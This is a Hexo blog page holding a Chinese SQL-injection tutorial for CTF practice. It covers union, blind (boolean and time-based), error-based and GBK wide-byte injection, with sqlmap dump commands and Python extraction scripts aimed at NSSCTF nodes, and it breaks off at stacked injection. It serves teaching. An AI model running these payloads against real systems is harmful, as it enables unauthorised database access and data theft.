@@ -1,0 +1,877 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="Hexo Theme Redefine">
+    
+    <meta name="author" content="The Redefine Team">
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="http://example.com/2025/03/09/sql注入/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+    
+    
+        
+        <meta name="description" content="Hexo Theme Redefine, Redefine Your Hexo Journey.">
+<meta property="og:type" content="article">
+<meta property="og:title" content="sql注入">
+<meta property="og:url" content="http://example.com/2025/03/09/sql%E6%B3%A8%E5%85%A5/index.html">
+<meta property="og:site_name" content="Bae">
+<meta property="og:description" content="Hexo Theme Redefine, Redefine Your Hexo Journey.">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/images/redefine-og.webp">
+<meta property="article:published_time" content="2025-03-09T15:01:07.000Z">
+<meta property="article:modified_time" content="2025-03-09T15:22:13.692Z">
+<meta property="article:author" content="Bae">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/images/redefine-og.webp">
+    
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="/images/redefine-favicon.svg" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/redefine-favicon.svg">
+    <meta name="theme-color" content="#A31F34">
+    <link rel="shortcut icon" href="/images/redefine-favicon.svg">
+    <!--- Page Info-->
+    
+    <title>
+        
+            sql注入 | Theme Redefine
+        
+    </title>
+
+    
+<link rel="stylesheet" href="/fonts/Chillax/chillax.css">
+
+
+    <!--- Inject Part-->
+    
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    
+        
+<link rel="stylesheet" href="/css/build/tailwind.css">
+
+    
+
+    
+<link rel="stylesheet" href="/fonts/GeistMono/geist-mono.css">
+
+    
+<link rel="stylesheet" href="/fonts/Geist/geist.css">
+
+    <!--- Font Part-->
+    
+    
+    
+    
+    
+    
+
+    <script id="hexo-configurations">
+    window.config = {"hostname":"example.com","root":"/","language":"zh-CN"};
+    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"delete_mask":false,"title_alignment":"left","headings_top_spacing":{"h1":"3.2rem","h2":"2.4rem","h3":"1.9rem","h4":"1.6rem","h5":"1.4rem","h6":"1.3rem"}},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","highlight_theme":{"light":"github","dark":"vs2015"},"font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"pangu_js":false,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null,"default_mode":"light"},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null},"title":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":false,"percentage":true},"website_counter":{"url":"https://cn.vercount.one/js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"preloader":{"enable":false,"custom_message":null},"open_graph":{"enable":true,"image":"/images/redefine-og.webp","description":"Hexo Theme Redefine, Redefine Your Hexo Journey."},"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"Theme Redefine","subtitle":{"text":[],"hitokoto":{"enable":false,"show_author":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":false,"style":"default","links":{"github":null,"instagram":null,"zhihu":null,"twitter":null,"email":null},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null,"lrc":null}]},"mermaid":{"enable":false,"version":"11.4.1"}},"version":"2.8.2","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"width":{"home":"1200px","pages":"1000px"},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"}},"search":{"enable":false,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"show_on_mobile":true,"links":null},"article_date_format":"auto","excerpt_length":200,"categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footerStart":"2022/8/17 11:45:14"};
+    window.lang_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"};
+    window.data = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/regular.min.css">
+
+    
+    
+    
+    
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+
+<body>
+	<div class="progress-bar-container">
+	
+
+	
+	<span class="pjax-progress-bar"></span>
+	<!--        <span class="swup-progress-icon">-->
+	<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
+	<!--        </span>-->
+	
+</div>
+
+<main class="page-container" id="swup">
+
+	
+
+	<div class="main-content-container flex flex-col justify-between min-h-dvh">
+		<div class="main-content-header">
+			<header class="navbar-container px-6 md:px-12">
+    <div class="navbar-content transition-navbar ">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                
+                Theme Redefine
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/"
+                                        >
+                                    <i class="fa-regular fa-house fa-fw"></i>
+                                    首页
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile sheet -->
+    <div class="navbar-drawer h-dvh w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between">
+        <ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start">
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/"
+                        >
+                            <span>
+                                首页
+                            </span>
+                            
+                                <i class="fa-regular fa-house fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+
+            
+            
+        </ul>
+
+        <div class="statistics flex justify-around my-2.5">
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">0</div>
+        <div class="label text-third-text-color text-sm">标签</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">0</div>
+        <div class="label text-third-text-color text-sm">分类</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">8</div>
+        <div class="label text-third-text-color text-sm">文章</div>
+    </a>
+</div>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+		</div>
+
+		<div class="main-content-body transition-fade-up">
+			
+
+			<div class="main-content">
+				<div class="post-page-container flex relative justify-between box-border w-full h-full">
+	<div class="article-content-container">
+
+		<div class="article-title relative w-full">
+			
+			<div class="w-full flex items-center pt-6 justify-start">
+				<h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">sql注入</h1>
+			</div>
+			
+		</div>
+
+		
+		<div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+			<div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
+				<img src="/images/redefine-avatar.svg">
+			</div>
+			<div class="info flex flex-col justify-between">
+				<div class="author flex items-center">
+					<span class="name text-default-text-color text-lg font-semibold">The Redefine Team</span>
+					
+					<span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv2</span>
+					
+				</div>
+				<div class="meta-info">
+					<div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2025-03-09 23:01:07</span>
+        <span class="mobile">2025-03-09 23:01:07</span>
+        <span class="hover-info">创建</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2025-03-09 23:22:13</span>
+            <span class="mobile">2025-03-09 23:22:13</span>
+            <span class="hover-info">更新</span>
+        </span>
+    
+
+    
+    
+
+    
+    
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+				</div>
+			</div>
+		</div>
+		
+
+		
+
+
+		<div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+			<h1 id="sql注入"><a class="markdownIt-Anchor" href="#sql注入">#</a> SQL 注入</h1>
+<h2 id="数据库基础"><a class="markdownIt-Anchor" href="#数据库基础">#</a> 数据库基础</h2>
+<ul>
+<li>
+<p>以 MySQL 5.7 为例，对于一个新安装好的 MySQL 数据库，至少会包含三个已经建立好的数据库分别是 <code>user</code> 、 <code>information_schema</code> 、 <code>performance_schema</code></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://cdn.jsdelivr.net/gh/bae4075/Noteimage@img/img/1448672-20190919203658089-195934788.png"
+                      alt="img"
+                ></p>
+<p>这些系统数据库中存储了 MySQL 的各个数据以及用户信息，而 SQL 注入就是通过绕过过滤利用这些系统表进行查询提取得到密码信息。</p>
+</li>
+<li>
+<p>常用的 SQL 注入语句</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">show databases # 列出所有数据库</span><br><span class="line">use test # 进入test数据库</span><br><span class="line">show tables # 列出当前数据库下所有表</span><br><span class="line">create table users (</span><br><span class="line">    id int not null primary key auto_increment,</span><br><span class="line">    username varchar(32) not null,</span><br><span class="line">    password varchar(32) not null</span><br><span class="line">) # 建表</span><br><span class="line">insert into users(username, password) values(&#x27;admin&#x27;, &#x27;admin&#x27;) # 增</span><br><span class="line">delete from users where username=&#x27;admin&#x27; # 删</span><br><span class="line">update users set password=&#x27;admin&#x27; where username=&#x27;admin&#x27; # 改</span><br><span class="line">select id from users where username=&#x27;admin&#x27; and password = &#x27;admin&#x27; # 查</span><br></pre></td></tr></table></figure></div>
+</li>
+</ul>
+<p>常用的 SQL 术语</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">字段：每个变量叫做字段</span><br><span class="line">列： 多个字段</span><br><span class="line">行：一个数据行简称一行</span><br><span class="line">结果集：SQL查询中的最终数据结果</span><br></pre></td></tr></table></figure></div>
+<h2 id="联合注入"><a class="markdownIt-Anchor" href="#联合注入">#</a> 联合注入</h2>
+<ul>
+<li>
+<p>通过上面的方法知道了注入类型之后，我们便可以进行下一步的操作了，这里我们以联合注入为例，来学习 MySQL 注入的过程</p>
+<p>联合注入是一种在 MySQL 中进行使用的方式，本质就是利用了 MySQL 的 <code>union</code>  关键字将前后两个结果集进行合并输出，这样便可以在正常的查询中带出我们的查询内容。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://cdn.jsdelivr.net/gh/bae4075/Noteimage@img/img/105874271e.jpeg"
+                      alt="NSSIMAGE"
+                ></p>
+<p>联合注入的步骤可以分解成一下几步：</p>
+<ol>
+<li>判断注入类型</li>
+<li>查列数</li>
+<li>确定字段位置</li>
+<li>查表名</li>
+<li>查列名</li>
+<li>获取数据</li>
+</ol>
+<p>下面我们便从查列数开始学习联合注入的过程</p>
+</li>
+</ul>
+<h2 id="判断注入类型"><a class="markdownIt-Anchor" href="#判断注入类型">#</a> 判断注入类型</h2>
+<ul>
+<li>
+<p>对于一般的 SQL 查询语句，有字符型和数值型查询，而每种里面又可以继续细分为盲注、爆错注入、二次注入等等具体的注入方式。</p>
+<p>如何判断注入类型呢，我们可以通过不同的字符串拼接并通过回显来判断具体类型。</p>
+</li>
+</ul>
+<h3 id="查列数"><a class="markdownIt-Anchor" href="#查列数">#</a> 查列数</h3>
+<ul>
+<li>
+<p>查列数即查结果集列中字段的数量，在联合注入中，这是很重要的一步，可以尝试下列语句</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select 1,2 union select 1,2,3 # ERROR 1222 (21000): The used SELECT statements have a different number of columns</span><br><span class="line">select 1,2 union select 1,2</span><br></pre></td></tr></table></figure></div>
+</li>
+</ul>
+<p>可以发现第一句会报错，这是因为前后两个结果集有不同的列数，所以在 SQL 注入中，我们最终的语句会拼接成</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select xxx,xxx, from xxx where xxx=xxx union select xxx,xxx</span><br></pre></td></tr></table></figure></div>
+<p>我们必须知道前面结果集的列数这样才能在后面构造正常的数目。</p>
+<p>一般我们使用 <code>order by</code>  来查询列数。</p>
+<p><code>order by</code>  是用来给数据排序的一个关键字，使用方法如下</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select * from users order by username # 按照username列排升序</span><br><span class="line">select * from users order by 2 # 按照第2列排升序</span><br><span class="line">select * from users order by 2 desc # 按照第二列排降序</span><br></pre></td></tr></table></figure></div>
+<p>这里我们主要注意第二种使用方法，例如尝试使用下面语句</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users order by 10 # ERROR 1054 (42S22): Unknown column &#x27;10&#x27; in &#x27;order clause</span><br></pre></td></tr></table></figure></div>
+<ul>
+<li>提示未知的第 10 列，我们要做的就是利用报错来查询列数。</li>
+</ul>
+<h3 id="确定字段位置"><a class="markdownIt-Anchor" href="#确定字段位置">#</a> 确定字段位置</h3>
+<ul>
+<li>
+<p>在获得了表的列数之后，就可以通过联合查询来获取数据库信息了，但在此之前，我们还需要确定每个字段显示在网页上的位置，方便后面查看数据，当然这一步并不是必须的，大部分做题的时候，通过只显示一个字段或我们可以通过猜测来确定字段的位置。</p>
+<p>做法很简单，我们通过联合上一个所有内容都不同的结果集再根据页面数据判断位置即可。</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union select 1,2,3,4,5</span><br></pre></td></tr></table></figure></div>
+</li>
+</ul>
+<p>值得注意的是，当页面只会显示一行数据时候，需要先拼上一个恒假的条件让前面的结果集没有输入从而数据我们的内容，不然如果前面有数据的话我们的结果集永远得不到输出。</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and 1=2 union select 1,2,3,4,5</span><br></pre></td></tr></table></figure></div>
+<h3 id="查表名"><a class="markdownIt-Anchor" href="#查表名">#</a> 查表名</h3>
+<ul>
+<li>
+<p>当完成了上述步骤之后，就可以进一步的查询数据库信息了，在查询表名之前，我们先来查询一些其他数据库信息。</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">database() # 查看当前数据库</span><br><span class="line">version() # 查看数据库版本信息</span><br><span class="line">user() # 查看当前数据库连接的用户</span><br></pre></td></tr></table></figure></div>
+</li>
+</ul>
+<p>查询方式就是将函数放在字段的位置，然后通过上一步就可以知道最终会在哪里输出了</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and 1=2 union select 1,database(), user(),3,4,5</span><br></pre></td></tr></table></figure></div>
+<p>进一步的我们可以获取数据库中其他数据表的名字，这需要利用到我们最开始所提及的系统数据库，在 <code>information_schema.tables</code>  中存储了其他数据表的内容，我们可以通过查询此表中的数据来得到表名</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select table_name from information_schema.tables where table_schema=&#x27;test&#x27;</span><br></pre></td></tr></table></figure></div>
+<h3 id="查列名"><a class="markdownIt-Anchor" href="#查列名">#</a> 查列名</h3>
+<ul>
+<li>
+<p>或者叫查字段名，我们已经获得了表名之后，接下来就是获取具体的字段名了，我们需要使用到 <code>information_schema.columns</code>  这张表</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select column_name from information_schema.columns where table_name=&#x27;xxx&#x27;</span><br></pre></td></tr></table></figure></div>
+</li>
+</ul>
+<h3 id="获取数据"><a class="markdownIt-Anchor" href="#获取数据">#</a> 获取数据</h3>
+<ul>
+<li>
+<p>在表名，列名都得到了的基础之上，我们就可以轻松的进行读取数据了</p>
+<ul>
+<li>
+<p>涉及的 payload</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;https://xxx/?id=1&amp;username=1&quot; --dbs # 查询所有数据库</span><br><span class="line">python sqlmap.py -u &quot;https://xxx/?id=1&amp;username=1&quot; -D test --tables # 查询test数据库下所有表</span><br><span class="line">python sqlmap.py -u &quot;https://xxx/?id=1&amp;username=1&quot; -D test --schema # 查询test数据库下所有表结构</span><br><span class="line">python sqlmap.py -u &quot;https://xxx/?id=1&amp;username=1&quot; -D test -T f1ag_table --column # 查询test数据库中f1ag_table表的列</span><br><span class="line">python sqlmap.py -u &quot;https://xxx/?id=1&amp;username=1&quot; -D test -T f1ag_table --dump # 获取f1ag_table表的内容</span><br><span class="line">python sqlmap.py -u &quot;https://xxx/&quot; --data &quot;id=1&quot; --dbs # 传输POST参数</span><br><span class="line">python sqlmap.py -u &quot;https://xxx/&quot; --all # 获取所有信息</span><br></pre></td></tr></table></figure></div>
+</li>
+</ul>
+</li>
+</ul>
+<p>\4. 布尔盲注和时间盲注</p>
+<h2 id="无回显盲注"><a class="markdownIt-Anchor" href="#无回显盲注">#</a> 无回显盲注</h2>
+<ul>
+<li>
+<p>上面我们学习了最基本的 SQL 注入方案，联合查询，这种方案能够生效的前提是页面能够给出回显内容，如果 SQL 查询完成之后页面不会给出查询的结果，那么我们即使完成了 SQL 注入也没法得到消息，这时候就需要使用无回显盲注来进行 SQL 注入</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://cdn.jsdelivr.net/gh/bae4075/Noteimage@img/img/09a50dd3ba.png"
+                      alt="NSS图片"
+                ></p>
+<p>盲注可以根据回显情况分为两种类型，一种是页面有部分回显的，例如返回登录是否成功，一种是没有任何回显的，我们可以分为</p>
+<ol>
+<li>bool 盲注</li>
+<li>时间盲注</li>
+</ol>
+</li>
+</ul>
+<h3 id="bool盲注"><a class="markdownIt-Anchor" href="#bool盲注">#</a> bool 盲注</h3>
+<ul>
+<li>
+<p>bool 盲注即利用页面的有限回显信息来进行注入，那么我们的信息如何被带出来呢？我们可以利用每次注入返回一个 bool 消息来进行判断信息，例如：</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">where id=1+if(substr((select database()), 1, 1)=&#x27;r&#x27;, 1, 0)</span><br></pre></td></tr></table></figure></div>
+</li>
+</ul>
+<p>如果 <code>id</code>  为 1 和 2 会返回不同的界面，那么我们就可以通过显示的界面来判断 database 名字的第一位是不是 <code>r</code> ，同理可以对其他位置进行判断。</p>
+<p>因为此类方式需要大量的判断才能得到正确的信息，所以我们一般使用脚本来执行我们的操作</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">url = &#x27;http://node4.anna.nssctf.cn:28411/&#x27; #url</span><br><span class="line">flag = &#x27;&#x27;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">for i in range(1, 50):</span><br><span class="line">    l,r = 32, 127</span><br><span class="line">    while l &lt; r:</span><br><span class="line">        mid = (l+r) // 2</span><br><span class="line">        # where id = 1</span><br><span class="line">        # payload = f&#x27;2-if(ascii(substr((select user()), &#123;i&#125;, 1))&lt;=&#123;mid&#125;, 1, 0)&#x27;</span><br><span class="line">        # payload = f&#x27;2-if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()), &#123;i&#125;, 1))&lt;=&#123;mid&#125;, 1, 0)&#x27;</span><br><span class="line">        # payload = f&#x27;2-if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=\&#x27;f1ag_table\&#x27;), &#123;i&#125;, 1))&lt;=&#123;mid&#125;, 1, 0)&#x27;</span><br><span class="line">        payload = f&#x27;2-if(ascii(substr((select group_concat(i_am_f1ag_column) from f1ag_table), &#123;i&#125;, 1))&lt;=&#123;mid&#125;, 1, 0)&#x27;</span><br><span class="line">        res = requests.get(url, params=&#123;</span><br><span class="line">            &#x27;id&#x27;: payload</span><br><span class="line">        &#125;)</span><br><span class="line">        if &quot;id = 1&quot; in res.text: # 判断回显信息</span><br><span class="line">            r = mid</span><br><span class="line">        else:</span><br><span class="line">            l = mid+1</span><br><span class="line">    flag += chr(l)</span><br><span class="line">    print(flag)</span><br></pre></td></tr></table></figure></div>
+<h3 id="时间盲注"><a class="markdownIt-Anchor" href="#时间盲注">#</a> 时间盲注</h3>
+<ul>
+<li>
+<p>时间盲注和 bool 盲注类似，但是如果页面任何可以利用的都没有的话，我们就无法直接得到 bool 信息了，所以我们可以通过延时的方式来制作一个 bool 信息</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">where id=1+if(substr((select database()), 1, 1)=&#x27;r&#x27;, sleep(3), 0)</span><br></pre></td></tr></table></figure></div>
+</li>
+</ul>
+<p>如果你发现页面响应时间大于 3 秒，这时候就可以确定 database 的首位是 <code>r</code>  了，同理对其他数据进行读取。</p>
+<p>同样，我们使用脚本来进行操作</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">url = &#x27;http://node4.anna.nssctf.cn:28690/&#x27; #url</span><br><span class="line">flag = &#x27;&#x27;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">for i in range(1, 50):</span><br><span class="line">    l,r = 32, 127</span><br><span class="line">    while l &lt; r:</span><br><span class="line">        mid = (l+r) // 2</span><br><span class="line">        # where id = 1</span><br><span class="line">        # payload = f&#x27;2-if(ascii(substr((select user()), &#123;i&#125;, 1))&lt;=&#123;mid&#125;, 1, 0)&#x27;</span><br><span class="line">        # payload = f&#x27;2-if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()), &#123;i&#125;, 1))&lt;=&#123;mid&#125;, 1, 0)&#x27;</span><br><span class="line">        # payload = f&#x27;2-if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=\&#x27;f1ag_table\&#x27;), &#123;i&#125;, 1))&lt;=&#123;mid&#125;, 1, 0)&#x27;</span><br><span class="line">        payload = f&#x27;2-if(ascii(substr((select group_concat(i_am_f1ag_column) from f1ag_table), &#123;i&#125;, 1))&lt;=&#123;mid&#125;, sleep(1), 0)&#x27;</span><br><span class="line">        res = requests.get(url, params=&#123;</span><br><span class="line">            &#x27;id&#x27;: payload</span><br><span class="line">        &#125;)</span><br><span class="line">        </span><br><span class="line">        if res.elapsed.total_seconds() &gt; 1.:</span><br><span class="line">            r = mid</span><br><span class="line">        else:</span><br><span class="line">            l = mid+1</span><br><span class="line">    flag += chr(l)</span><br><span class="line">    print(flag)</span><br></pre></td></tr></table></figure></div>
+<p>\5. 报错注入 &amp; 宽字节注入</p>
+<h2 id="报错注入"><a class="markdownIt-Anchor" href="#报错注入">#</a> 报错注入</h2>
+<ul>
+<li>
+<p>当页面会给出报错信息的时候，我们使用利用这些报错信息带出我们的查询内容</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://cdn.jsdelivr.net/gh/bae4075/Noteimage@img/img/899bee6fc5.jpeg"
+                      alt="NSS图片"
+                ></p>
+<p>除了 <code>updatexml</code>  外还可以使用 <code>extractvalue</code>  进行使用，例如</p>
+<p><code>extractvalue(null, concat(0x7e, (select user())))</code></p>
+<p>图片上的不对应该是 7e    73 出来是 @会有一些缺失</p>
+</li>
+</ul>
+<h2 id="宽字节注入"><a class="markdownIt-Anchor" href="#宽字节注入">#</a> 宽字节注入</h2>
+<ul>
+<li>
+<p>当 mysql 使用 GBK 编码，但是链接的容器并没有声明编码时，可以用此方法绕过过滤函数</p>
+<p><code>mysqli_real_escape_string</code>  会将参数内特殊字符前加上转译符，这样便可以防止 SQL 注入</p>
+<p>但是如果没有声明 <code>gbk</code>  编码时，对于大于 <code>128</code>  的 ASCII 码并不会认为是特殊字符。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://cdn.jsdelivr.net/gh/bae4075/Noteimage@img/img/7370358c41.jpeg"
+                      alt="NSS图片"
+                ></p>
+<p>这样我们输入的 <code>%df'</code> ，经过 <code>mysqli_real_escape_string</code>  函数后会变成 <code>%df\'</code> , 但是在 mysql 中，因为是 gbk 编码，会将 <code>%df\</code>  看作一个汉字 <code>運</code> ，这样我们的单引号便逃逸了出来。</p>
+</li>
+</ul>
+<p>\6. 堆叠注入</p>
+<h2 id="堆叠注入"><a class="markdownIt-Anchor" href="#堆叠注入">#</a> 堆叠注入</h2>
+<ul>
+<li>
+<p>也叫多行注入，当代码允许多行查询时候使用，一般是在 select 等关键字被过滤的时候进行使用的。</p>
+<p>对于堆叠注入，我们一般使用两种方式进行绕过 select</p>
+<ol>
+<li>查表</li>
+</ol>
